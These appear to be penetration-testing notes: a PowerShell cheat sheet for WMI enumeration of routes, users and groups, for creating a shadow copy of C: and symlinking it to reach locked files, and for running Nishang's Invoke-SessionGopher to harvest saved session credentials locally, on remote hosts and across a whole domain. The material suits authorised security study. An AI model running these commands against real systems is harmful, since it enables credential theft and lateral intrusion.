#### Use Full Classes

- Win32_IP4RouteTable
- Win32_UserAccount
- Win32_Group
- Win32_ShadowCopy
- StdRegProv

#### Enumeration Locally

Network
`PS > gwmi -Class win32_ip4routetable -list
`PS > gwmi -Class win32_ip4routetable

User & Group
`PS > gwmi -Class win32_UserAccount -list
`PS > gwmi -Class win32_UserAccount
`PS > gwmi -Class Win32_Group -list
`PS > gwmi -Class Win32_Group

Shadow Copy
- Create Shadow Copy
	`PS > (gwmi -Class win32_ShadowCopy -List).methods
	`PS > (gwmi -Class win32_ShadowCopy -List).Create
	`PS > (gwmi -Class win32_ShadowCopy -List).Create("C:\","venom")
`PS > gwmi -Class win32_ShadowCopy -List
`PS > gwmi -Class win32_ShadowCopy
Lets link the object device to C Drive
`PS > $link = (gwmi -Class win32_shadowCopy).DeviceObject + "\"
`PS > cmd /c mklink /d C:\shadow "$link"
#### *module*

`NISHANG
Local Enumeration
`PS > ipmo nishang\nishang-master\Gather\Invoke-SessionGopher.ps1
`PS > Invoke-SessionGopher -Verbos
Remote Enumeration
`PS > Invoke-SessionGopher -Verbos -ComputerName x.x.x.x -Credential domain\user
All Machine in domain
`PS > Invoke-SessionGopher -Verbos -Credential domain\user -AllDomain
`PS > Invoke-SessionGopher -Verbos -Credential domain\user -AllDomain -ExcludeDC
`PS > Invoke-SessionGopher -Verbos -AllDomain
`PS > Invoke-SessionGopher -Verbos -AllDomain -ExcludeDC